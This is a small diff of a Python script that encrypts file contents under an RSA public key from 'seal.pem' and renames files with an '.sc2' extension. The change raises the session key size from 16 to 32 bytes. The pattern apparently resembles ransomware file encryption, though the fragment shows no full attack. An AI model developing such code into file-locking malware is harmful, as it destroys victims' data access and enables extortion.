@@ -25,13 +25,12 @@ def old_encrypt(f):
 def replace_file(file):
     os.rename(file,file+'.sc2')
 # ======================================OLD==================================
-
 def encrypt(f):
     with open(f,"rb") as file:
         data = file.read()
 
     recipient_key = RSA.import_key(open("seal.pem").read())
-    session_key = get_random_bytes(16)
+    session_key = get_random_bytes(32)
 
     # Encrypt the session key with the public RSA key
     cipher_rsa = PKCS1_OAEP.new(recipient_key)
